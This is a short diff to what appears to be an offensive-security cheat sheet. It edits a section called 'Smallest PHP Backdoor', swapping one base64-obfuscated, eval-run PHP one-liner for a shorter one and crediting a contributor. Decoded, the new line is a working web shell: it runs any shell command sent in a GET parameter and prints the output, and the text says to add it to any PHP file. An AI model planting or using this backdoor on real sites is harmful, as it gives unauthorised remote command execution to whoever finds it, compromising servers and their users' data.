@@ -1081,11 +1081,11 @@ Other methods:
 <a id="carriage-return-backdoor"></a>
 **6.iv. Smallest PHP Backdoor**
 
-
 Add this line to the beginning of any PHP file:
 ```php
-<?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7ZWNobyBgJF9QT1NUWzBdYDtleGl0O30");eval($i);?>
+<?php $i=base64_decode("aWYoaXNzZXQoJF9HRVRbMF0pKXtlY2hvIGAkX0dFVFswXWA7ZXhpdDt9");eval($i);?>
 ```
+(Thanks @dono for making this 3 bytes smaller than the smallest)
 
 Test the backdoor:
 ```sh
